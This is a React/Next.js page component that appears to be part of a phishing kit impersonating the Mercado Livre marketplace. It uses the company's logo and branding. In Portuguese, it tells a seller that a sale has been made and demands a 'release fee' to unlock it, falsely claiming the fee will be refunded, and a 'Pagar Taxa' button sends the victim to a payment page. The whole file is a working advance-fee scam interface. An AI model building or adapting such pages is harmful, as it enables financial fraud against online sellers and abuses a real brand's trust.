"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

import { verifyPaymentUser } from "@/actions/verifyPayment";
import { LoadingComponent } from "@/loading";
import { formatCurrencyBRL } from "@/utils/formatCurrencyBRL";

export default function VerifyPaymentPage() {
  const router = useRouter();

  const [loading, setLoading] = useState(true);
  const [value, setValue] = useState(0);

  const next = () => router.push("pay");

  const getPaymentValue = async () => {
    const data = await verifyPaymentUser();

    setValue(data.value);

    setLoading(false);
  };

  useEffect(() => {
    getPaymentValue();
  }, []);

  if (loading) {
    return <LoadingComponent />;
  }

  return (
    <div>
      <header>
        <nav className="flex p-4 items-center justify-between  bg-[#FFE600] shadow-md">
          <button className="text-4xl">☰</button>

          <a href="./" aria-label="ir para a página inicial">
            <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.117/mercadolibre/pt_logo_large_plus@2x.webp" />
          </a>

          <div className="flex items-center">
            <a href="#" className="text-xl">
              Ajuda
            </a>
          </div>
        </nav>
      </header>

      <main className="flex flex-col items-center justify-center mt-10 px-10 w-screen">
        <input
          type="text"
          placeholder={`busque "richards"`}
          className=" rounded border-[#e2e0e2] border-[1px] p-4 h-[40px] max-w-full min-w-[400px] mb-6"
        />

        <div className="bg-[#2968C8] p-6 flex flex-col items-center gap-4 rounded-xl w-full">
          <h2 className="text-white text-4xl font-bold">RECADO IMPORTANTE:</h2>

          <p className="text-2xl text-white text-center">
            Identificamos que você acabou de realizar uma venda do seu produto.
            No entanto, não possui pontuação como vendedor no nosso aplicativo.
            Para evitar fraudes, como anúncios falsos, estamos implementando uma
            política de segurança para evitar (anúnciantes falsos).
          </p>
        </div>

        <div className="bg-[#2968C8] p-6 flex flex-col items-center gap-4 rounded-xl w-full mt-6">
          <p className="text-2xl text-white text-center">
            Iremos cobrar nossa taxa de liberação por questões de segurança e
            para garantir que você realmente deseja vender seu produto em nosso
            sistema de vendas. Lembrando que este valor será devolvido junto com
            o valor da venda.
          </p>
        </div>

        <div className="flex flex-col justify-center items-center mt-4">
          <svg
            width="60"
            height="60"
            viewBox="0 0 100 100"
            xmlns="http://www.w3.org/2000/svg"
          >
            <polygon points="50,80 10,20 90,20" fill="#2968C8" />
          </svg>

          <p className="text-xl mt-2 mb-4 font-semibold">
            Taxa de Liberação: {formatCurrencyBRL(value)}
          </p>

          <button
            className="bg-[#2968C8] w-auto text-white px-4 py-2 rounded-md text-xl"
            onClick={next}
          >
            Pagar Taxa
          </button>

          <p className="text-base text-center mt-4">
            Ao criar uma conta, você está de acordo com os{" "}
            <a href="#" className="text-[#2968C8]">
              termos de serviço{" "}
            </a>{" "}
            e a{" "}
            <a href="#" className="text-[#2968C8]">
              política de privacidade
            </a>{" "}
            do meli.
          </p>
        </div>
      </main>
    </div>
  );
}
